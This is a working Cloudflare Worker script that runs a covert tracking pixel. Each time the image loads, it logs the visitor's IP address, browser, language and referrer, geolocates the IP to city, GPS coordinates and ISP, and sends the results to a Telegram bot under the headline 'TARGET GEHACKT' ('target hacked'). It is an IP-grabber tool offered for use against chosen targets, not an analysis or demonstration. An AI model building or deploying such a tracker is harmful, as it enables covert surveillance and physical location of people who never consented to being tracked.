export default {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);

    if (url.pathname === "/pixel") {
      const ip = request.headers.get("CF-Connecting-IP") || "unknown";
      const ua = request.headers.get("User-Agent") || "unknown";
      const lang = request.headers.get("Accept-Language") || "unknown";
      const ref = request.headers.get("Referer") || "Direkt";
      const tag = url.searchParams.get("c") || "unbekannt";
      const t = new Date().toISOString();

      let loc = "Unbekannt", isp = "Unbekannt", asn = "Unbekannt", timezone = "Unbekannt";
      let lat = "?", lon = "?";

      try {
        // Detaillierte API-Abfrage
        const res = await fetch(`https://ipwho.is/${ip}`);
        const data = await res.json();
        
        if (data.success) {
          loc = `${data.city || '?'}, ${data.region || '?'}, ${data.country || '?'}`;
          isp = data.connection?.isp || "?";
          asn = `AS${data.connection?.asn || '?'} (${data.connection?.org || '?'})`;
          timezone = data.timezone?.id || "?";
          lat = data.latitude || "?";
          lon = data.longitude || "?";
        }
      } catch (e) {}

      // In KV speichern
      try {
        if (env.HITS) {
          await env.HITS.put(Date.now() + "-" + ip, JSON.stringify({ ip, ua, tag, t, loc, isp }));
        }
      } catch (e) {}

      if (env.BOT_TOKEN && env.CHAT_ID) {
        const msg = 
          `🚨 **TARGET GEHACKT** 🚨\n` +
          `🏷️ **Tag:** ${tag}\n` +
          `🌐 **IP:** \`${ip}\`\n` +
          `📍 **Ort:** ${loc}\n` +
          `🗺️ **GPS:** ${lat}, ${lon}\n` +
          `📡 **Provider:** ${isp}\n` +
          `🏢 **ASN:** ${asn}\n` +
          `🕒 **Zeitzone:** ${timezone}\n` +
          `🗣️ **Sprache:** ${lang}\n` +
          `🔗 **Referer:** ${ref}\n` +
          `📱 **Device:** \`${ua}\`\n` +
          `⏰ **Zeit:** ${t}`;

        try {
          await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              chat_id: env.CHAT_ID,
              text: msg,
              parse_mode: "Markdown"
            })
          });
        } catch (e) {}
      }

      const gif = Uint8Array.from(atob("R0lGODlhAQABAIAAAAAAAP///ywAAAAAAQABAAACAUwAOw=="), c => c.charCodeAt(0));
      return new Response(gif, { headers: { "Content-Type": "image/gif", "Cache-Control": "no-store" } });
    }

    return new Response("Läuft.", { status: 200 });
  }
};
